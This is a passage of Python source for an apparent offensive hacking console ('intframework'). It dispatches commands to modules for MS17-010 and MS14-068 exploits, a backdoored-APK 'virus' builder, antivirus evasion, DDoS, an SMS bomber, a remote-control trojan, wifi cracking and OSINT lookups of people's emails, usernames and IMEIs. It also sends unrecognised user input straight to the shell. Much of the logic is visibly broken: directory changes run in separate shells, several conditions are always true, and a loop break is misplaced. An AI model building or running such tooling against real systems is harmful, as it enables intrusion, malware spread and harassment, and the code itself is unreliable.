| /intframework/modules/exploits/ShellShock/        |
| /intframework/modules/exploits/TorCT-Shell/      |
| /intframework/modules/exploits/WifiToolInstaller/    |
| /intframework/modules/exploits/gwn700/              |
| /intframework/modules/exploits/se0wned/              |
| /intframework/modules/exploits/se0wned/              |
| /intframework/modules/exploits/Brainpan-Exploit.py/   |
| /intframework/modules/exploits/Httproxyscan.py/ |
| /intframework/modules/exploits/carpwned.py/    |
| /intframework/modules/exploits/php_carpwn.py/     |
| /intframework/modules/exploits/CrashCast/           |
| /intframework/modules/exploits/DropleGanger/         |
| /intframework/modules/exploits//       |
| /intframework/modules/exploits/CVE2018-10561/       |
| /intframework/modules/exploits/Fuzzering/           |
| /intframework/modules/exploits/ac68.py/             |
+------------------------------------------------------------------------+
    	""")
    if help_input.startswith("set evasions"):
    	global evasion_h
    	evasion_h = help_input[13:]
    	strvasion = help_input.split("LHOSTS=")[1].split(":")[0]
    	strvas = help_input[help_input.find("LPORTS="):help_input.find(":", help_input.find("LPORTS="))][:-2 if help_input[help_input.find("LPORTS="):help_input.find(":", help_input.find("LPORTS="))].endswith("6535") else -4]
    	output_file = help_input[help_input.find("--output ")+len("--output "):].split()[0] if "--output " in help_input else (help_input[help_input.find("-o ")+len("-o "):].split()[0] if "-o " in help_input else None)
    	code_sp = help_input.split("-c")[1].strip() if "-c" in help_input else None
    	use_us = help_input[help_input.find("-u "):]
    	if evasions_u == "used":
    		if evasion_h == "1":
    			os.system("cd tools")
    			os.system("cd Phantom-Evasion")
    			os.system('python3 phantom-evasion.py')
    		else:
    			try:
    				os.system(f"python3 evasionint.py -l {strvasion} -p {strvas} -c {code_sp} -u {use_us}")
    				get_input(modules="evasion", modulename=use_us)
    			except:
    				pass	
    	else:
    		print(Fore.RED + "No used evasion" + Fore.RESET + """please use "use evasion" """)
    if help_input.startswith("set banner"):
    	bannerss = help_input[12:] or help_input[15:]
    	banner += [bannerss]   
    elif help_input.startswith("search '") and help_input.endswith("'"):
	   # Extract module name from user input
        query = help_input[8:-1]  # Remove "search'" prefix and "'" suffix to get the module name
        results = search(modules, query)
        if results:
        	print("Search results:")
        for modul, description in results.items():
        	print(f"{modul}: {description}")
        else:
        	print(f"No results found for '{query}'.")
    if help_input.startswith("meterpreter") and help_input.endswith(""):
    			os.system("python3 intmeterpreter.py start")
    			add_job("meterpreter")
    if help_input.startswith("check"):
    	check_chef = help_input[6:]
    	check_ip(check_chef)
    if help_input.startswith("jobs"):
    	list_jobs()
    	if "-k" in help_input:
    		job_id = help_input[help_input.find("-k "):]
    		kill_job(job_id)
    if help_input == "use bots":
    	print("""
    	   BOT   NAME          Language        platform
    	----------------------------    ----------------        ------------
    	smsbomber/bot1   turkish/Türkiye termux
    	mailinputter/bot1   english/US          whattsapp
    	  genius_ip/bot1      turkish/Türkiye   telegram  
    	""")
    	setter = input(f"{Fore.RED + Style.BRIGHT} int4 (bot selecter) >")
    	if setter == "smsbomber/bot1":
    		get_input(modulename="bots", modules="smsbomber-bot")
    	if setter == "mailinputter/bot1":
    		get_input(modulename="bots", modules="mailinputter-bot")
    	if setter == "genius_ip/bot1":
    		get_input(modulename="bots", modules="genius_ip-bot")
    if help_input.startswith("dns"):
    	if "-f" in help_input:
    		format_chef = help_input[help_input.find("-f "):]
    		main_chef = help_input[help_input.find("DHOST="):]
    		port_chef = help_input[help_input.find(":" or "DPORT="):]
    		domain, port = parse_input(help_input)
    		def tryp(domain):
    		  try:
    		  	socket.inet_aton(domain)
    		  	is_ip = True
    		  except socket.error:
    		  	is_ip = False
    		tryp(domain)
    		
    		if format_chef.lower() == "reverse":
    			if is_ip:
    				reverse_dns_lookup(domain, port)
    			else:
    				print("is not ip")    			
    		if format_chef.lower() == "txt":
    			dns_lookup_txt(domain, port)
    		if format_chef.lower() == "a":
    			dns_lookup_a(domain, port)
    		if format_chef.lower() == "mx":
    			dns_lookup_mx(domain, port)
    		if format_chef.lower() == "ns":
    			dns_lookup_ns(domain, port)
    if help_input.lower().startswith("intninja"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intninja.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intvenom"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intvenom.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intweb"):
    	hel = help_input[7:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intweb "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("introjan"):
    	hel = help_input[9:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 introjan.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intcam"):
    	hel = help_input[7]
    	s = os.getcwd()
    	os.system("$INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 intcam.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("oip"):
    	hel = help_input[4:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 oip "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmail"):
    	hel = help_input[8:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("cd modules")
    	os.system("python3 modules/intmail.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("intmeterpreter"):
    	hel = help_input[15:]
    	s = os.getcwd()
    	os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	os.system("python3 modules/intmeterpreter.py "+hel)
    	os.system(f"cd {s}")
    if help_input.lower().startswith("imei"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[5:]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 imei.py "+hel)
    		os.system(f"cd {s}")
    	else:
    		pass	
    if help_input.lower().startswith("mailsearcher"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("mailsearcher"):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 mailsearcher.py"+hel)
    		os.system(f"cd {s}")
    if help_input.startswith("usersearcher"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("usersearcher"):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 usersearcher.py"+hel)
    		os.system(f"cd {s}")
    if help_input.startswith("shotgun"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("shotgun "):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system(f"python3 shotgun.py {hel}" if hel else "python3 shotgun.py")
    		os.system(f"cd {s}")
    if help_input.startswith("intcrawler"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("intcrawler "):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 intcrawler.py {hel}" if hel else "python3 intcrawler.py.")
    		os.system(f"cd {s}")
    if help_input.lower().startswith("run"):
    	get_run = help_input[4:]
    	if use_framework(framework, exploit_name) or get_run == 'exploit':
    		framework = import_framework()
    		run_exploit(framework['current_exploit'])
    	else:
    		pass
    	if get_input(cdn="shodan") or get_input(modulename="shodan") or get_run == "shodan":
    		stripting = help_input[help_input.lower().find("bset domain=") + len("bset domain="):].lower().strip() if "Domain" in help_input else ""
    		api = help_input[help_input.lower().find("bset api=") + len("bset api="):].lower().strip() if "bset api=" in help_input else ""
    		try:
    			s = os.getcwd()
    			os.system("cd $INTFRAMEWORK_PATH && cd modules")
    			os.system(f"python3 shodan.py api_key "+api+" --query"+stripting)
    			os.system(f"cd {s}")
    		except:
    			print("Seems like you're hitting a wrong API or not routing your IP properly. Make sure your endpoints are legit and your IP config is on point.")
    			pass
    	else:
    		pass
    	get = help_input[10:]
    	if get_input(cdn="auxiliary" or cdn.startswith("auxiliary/")):
    		get = help_input[10:]
    		if get_input(cdn).startswith("auxiliary/"):
    		    get = help_input[11:]
    	else:
    		pass
    	if get_input(modulename="exploit", modules="/multi/handler"):
    		print(f"""
 TARGET      REQUIRED     DESCRİPTİON
========    =========   =============
  {LHOSTS if LHOSTS else None} No  creating viruses
  {LPORTS if LPORTS else None}
    		""")
    		print("[*] creating...")
    		os.system("python3 inthandler.py")
    		print("[*] Sending...")
    		try:
    			os.system(f"python3 intvenom.py LHOSTS={LHOSTS if LHOSTS else None} LPORTS={LPORTS if LPORTS else None} --original-apk intframework-virus.apk --output-apk virus.apk")
    			print("[+] Sended and created")
    		except Exception as e:
    			print("[-] {e}")
    			pass # .pass to pass
    	else:
    		pass
    	if get_input(modulename="exploit", modules="DiamondFox"):
    		print(f"""
 TARGET      REQUIRED     DESCRİPTİON
========    =========   =============
  {LHOSTS if LHOSTS else None} Yes    Exploit
  {LPORTS if LPORTS else None}
    		""")
    		print("[*] getting path...")
    		s = os.getcwd()
    		print("[*] entering...")
    		os.system("cd $INTFRAMEWORK_PATH && cd modules && cd exploits && cd DiamondFox")
    		print("[*] running")
    		os.system("python3 diamondpwn.py {LHOSTS}")
    		print("[+] runned!")
    		os.system(f"cd {s}")
    		pass
    	else:
    		pass
    	if get_input(modules="MS17-010", modulename="exploit"):
    		print(f"""
 TARGET      REQUİRED    DESCRİPTİON
========   =========  =============
{LHOSTS if LHOSTS else None}    No     REMOTİNG
    		""")
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules && cd exploits && cd MS17-010")
    		os.system("python3 eternalblue.py")
    		os.system(f"cd {s}")
    	else:
    		pass
    	if get_input(modulename="exploit", modules="MS14-068"):
    		print(f"""
 TARGET      REQUİRED    DESCRİPTİON
========   =========  =============
{LHOSTS if LHOSTS else None}    No    Leak
    		""")
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules && cd exploits && cd MS14-068")
    		os.system("python ms14068.py")
    	else:
    		pass
    	if get_input(modulename="exploit", modules="ac68.py"):
    		s = os.getcwd()
    		print(f"""
 TARGET      REQUİRED    DESCRİPTİON
========   =========  =============
{LHOSTS if LHOSTS else None}    No    hacking
    		""")    		
    		os.system("cd $INTFRAMEWORK_PATH && cd modules && python ac68.py {LHOSTS if LHOSTS else None} {LPORTS if LPORTS else None} && cd {s}")
    	else:
    		pass
    	if get.lower() == "dos":
    		stripting = help_input[help_input.find("select") + len("select"):].strip() if "select" in help_input else ""
    		if stripting == "dos.py":
    			os.system("python3 DDOS.py")
    		if stripting.lower() == "doshack":
    			os.system("""
    			cd $INTFRAMEWORK_PATH
    			cd DoShAcK
    			python Doshack.py
    			""")
    	else:
    		pass
    	if get.lower() == "social-enginering":
    		if get_input(cdn="auxiliary/social-enginering"):
    			get1 = get_input[get_input().find("auxoliary/social-enginering"):]
    			get2 = help_input[help_input.find("run "):]
    			if get2 == "--spc-discord":
    				os.system("python3 DISCORD.py")
    	else:
    		t.sleep(0.2)
    		pass
    elif help_input.lower().startswith("back"):
    	get_input()
    elif help_input.lower().startswith("info" or "get-help"):
    	global info_get
    	if help_input.lower().startswith("info"):
    		info_get = help_input[5:]
    	if help_input.lower().startswith("get-help"):
    		info_get = help_input[9:]
    	else:
    		print("invalid argument detected")
    	if info_get.lower() == "dns":
    		print("""
            usage:
        
            Commands           Function
            ==========         ========              
            DHOST=             İP OR HOST
            -f (Format)   >>    formatting dns example modules: txt, mx, ns, a
            DPORT
        
            example:
                dns DHOST=127.0.0.1:90 -f txt
                dns DHOST=127.0.0.1 DPORT=90 -f mx
                """)
    		if info_get.lower() == "connect":
    			print("""
    			usage: connect CHOST=(HOST) CPORT=(PORT)
    			CHOST:
    				your target host or your want to connect host
    			CPORT:
    				your tadget port or your want to connect port
    			Commands       Function
    		   ==========     =========
    		   CHOST               connecting target host
    		   CPORT               connecting target port
    			""")
    		if info_get.lower() == "introjan":
    			print("""
İNTROJAN COMMANDS
=====================
    |Command|           |Function|
    ------------------            ----------------
	 -ip or -ipv4           -İp adress of the target
	 -k   					   -connect a cable
	 -r or --remote      -remote to lxde or cmd
	 -d or --dir			 -directory show on computer
	 -g   {video url}     -open video url on computer	
	 -p    				  	-port
	 -s or --send-message  -send ip or cable to computer
    			""")
    		if info_get.lower() == "oip":
    			print("""
    			
    			""")
    		if info_get.lower() == "vp":
    			print("""
    			Commands      Function
    		   ===========  =========
    		     -a --add           adding and installing vp
    		     -b --build		building vp
    		     
    		     example:
    		     	vp -a or vp --add
    		     	vp -b or vp --build    		     	
    			""")
    		if info_get.lower() == "use":
    			print("""
    			Commands    Function
    		   ==========  =========
    		    modules        using intmodules
    		    exploit            using exploits
    		    exploit/          using exploits but path
    		    payloads       using payloads
    		    auxiliary        using auxiliary modules
    		    shodan          using shodan
    		    osint              using osint
    		    attack            intikam21 attack modules
    		    drones           using intdrones
    		    scanners       using scanner
    		    
    		    example:
    		    	use modules /intframework/modules/intcrawler/
    			""")
    elif help_input.startswith("connect"):
    	ip_chef = help_input[help_input.lower().find("CHOSTS=" or "CHOST= "):]
    	port_chef = help_input[help_input.lower().find("CPORT=" or "CPORTS=")]
    	if ip_chef:
    		listen(ip_chef)
    	if ip_chef and port_chef:
    		listen_p(ip_chef, port_chef)
    else:
    	try:
    		pass
    	except:
    		pass
    if help_input.startswith("searchuser"):
    	if get_input(cdn="osint&int"):
    		hel = help_input[help_input.find("searchuser "):]
    		s = os.getcwd()
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    		os.system("python3 searchuser.py "+hel if hel else "python3 searchuser.py")
    		os.system(f"cd {s}")
    	else:
    		os.system(help_input)
    if help_input.startswith("intserver"):
    	if "--autoupdate" in help_input:
    		os.system("python3 update.py")
    	if "shot" in help_input:
    		os.system(f"python3 shotgun.py LHOSTS={LHOSTS if LHOSTS else None} LPORTS={LPORTS if LPORTS else None} bytes=200000")
    elif help_input == "banner":
    	banner()
    	menu_banner()
    elif help_input.startswith("vp"):
    	if '-' not in help_input:
    		print("please arguments")
    	if '-w' or '--start-web' in help_input:
    		os.system("python3 webstarter.py")
    	else:
    		pass
    	if '-a' or '--add' in help_input:
    		global add_add
    		add_add = "ADDED"
    	else:
    		pass
    	if '-a' or '--add' not in help_input:
    		add_add = None
    	else:
    		pass
    	if '-b' or '--build' in help_input:
    		if add_add == None:
    			print("please use vp add command first")
    			global add_slan
    			add_slan = None
    		if add_add == "ADDED":
    			import pyfiglet
    			a = pyfiglet.figlet_format("INTIKAM21 OFFİCİAL") 
    			print(a)
    			print("starting")
    			t.sleep(3)
    			os.system("sh intvirtualstarter.sh")
    			add_job("intikam21 virtual pc")
    			add_slan = "YES"
    		elif add_slan == "YES" and add_add == "ADDED":
    			print("builded you are must use -all")
    	else:
    		pass
    	if '-all' in help_input:
    		os.system("""
			python3 İNTOFİCCİAL.py
			""")
    	else:
    		pass
    elif help_input == "anim-exit":
    	s = os.getcwd()
    	try:
    		os.system("cd $INTFRAMEWORK_PATH && cd modules")
    	except:
    		pass
    	os.system("python3 intly.py")
    	os.system(f"cd {s}")
    	exit() 
    else:
    	exit()

    if help_input == "show scanners":
    	print("""
+------------------------------------------------------------------------+
|                         SCANNERS                                   |
+====================================+
| /intframework/modules/scanners/portscan |
| /intframework/modules/scanners/bluetooth_scanners.py|
| /intframework/modules/scanners/dirscanner|
| /intframework/modules/scanners/emailscan|
| /intframework/modules/scanners/userscan |
| /intframework/modules/scanners/wlanscanner|
| /intframework/modules/scanners/adminfinder |
| /intframework/modules/scanners/service_scanner|
| /intframework/modules/scanners/vulnerability_scanner|
| /intframework/modules/scanners/dns_scanner|
| /intframework/modules/scanners/ping_scan|
| /intframework/modules/scanners/network_scan|
| /intframework/modules/scanners/Crack/wificracker|
+------------------------------------------------------------------------+    	
    	""")
    if help_input.startswith("wardriving"):
    	setdbs = help_input[11:]
    	if setdbs == "start":
    		set_wlan = help_input[17:]
    		scan5115(set_wlan)
    	if setdbs == "end" or "exit" or "break":
    		break
    		continue
    else:
    	pass
    if help_input == "wifi_scan":
    	scan_wifispy()
    else:
    	print("not rooted")
    if help_input.startswith("db_nmap"):
        # Nmap komutunu çalıştır
        nmap_scanner = NmapScanner()
        if help_input == "db_nmap -l":
                # Veritabanındaki sonuçları listele
            print("Listing scan results:")
            nmap_scanner.db.list_scan_results()

        elif help_input == "db_nmap close":
                # Veritabanı bağlantısını kapat
            print("Closing database...")
            nmap_scanner.db.close()
            os.remove(nmap_scanner.db.db_name)  # Veritabanı dosyasını sil
            print("Database file deleted.")

        else:
        	nmap_command = help_input.replace("db_nmap", "nmap")
        	nmap_scanner.run_command(nmap_command)
    if help_input == "db_connect":
    	st = "started"
    if help_input == "db_list":
    	db_list()
    if help_input  == "db_disconnect":
    	db_disconnect()
    if help_input.startswith("load_plugins"):
    	arg = help_input[13:]
    	try:
    		pg_manager.load_plugin(arg)
    	except:
    		print("")
    		pass
    else:
    	pass
    if help_input.startswith("session"):
    	d = help_input[8:]
    	if d.startswith("-k"):
    		kill_id = d[3:]
    		kill_session(kill_id)
    	if d == "-l":
    		load_sessions()
    		session_listele()
    		cleanup()
    if "use" in help_input:
    	user = input(Fore.RED + "int4 " + Fore.RESET + "(" + Fore.RED + "selecter" + Fore.RESET + ")"+ f"[{Fore.RED + Style.BRIGHT} Select exploiter or modular + {Fore.RESET}]" + " >" + Style.RESET_ALL)
    	if user == "modular":
    		os.system("python3 modular.py")
    	if user == "exploiter":
    		os.system("python3 exploiter.py")
    if "set" in help_input:
    	user = input(Fore.RED + "int4 " + Fore.RESET + "(" + Fore.RED + "selecter" + Fore.RESET + ")"+ f"[{Fore.RED + Style.BRIGHT} Select exploiter or modular  {Fore.RESET}]" + " >" + Style.RESET_ALL)
    	if user == "modular":
    		os.system("python3 modular.py")
    	if user == "exploiter":
    		os.system("python3 exploiter.py")
    if help_input == "exploiter":
    	print("new exploiter session created")
    	while True:
    		from exploiter import *
    		sploiter()
    if help_input == "modular":
    	os.system("python3 modular.py")
    if help_input == "list_plugins":
    	pg_manager.list_plugins()
    else:
    	pass
    if help_input == "run_plugins":
    	hpl_list = help_input.split()
    	command = hpl_list[2]
    	args = hpl_list[3]
    	manager.run_command(command, *args)
    else:
    	pass
    if help_input == "neofetch":
    	os.system("python3 neofetch.py")
    	add_job("neofetch")
    else:
    	pass
    if help_input.startswith("network_scan"):
    	import network_scan
    	from network_scan import *
    	scan_network()
    if help_input == "osint":
    	print("https://osintframework.com/")
    if help_input == "whoami":
    	username = getpass.getuser()
    	# Sistemin platform bilgisini alma
    	platform_info = platform.system()
    	print(Fore.GREEN + username)
    help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}
    if help_input in help:
    	os.system("help")
    if not any(help_input.startswith(command) for command in valid_commands):
    	t.sleep(0.75)
    	self_dir = os.getcwd()
    	os.system("cd ~")
    	os.system(help_input)
    	add_job(help_input)
    	os.system(f"cd {self_dir}")
    else:
    	pass
    try:
    	if st == "started":
    		db_connect()
    except:
    	pass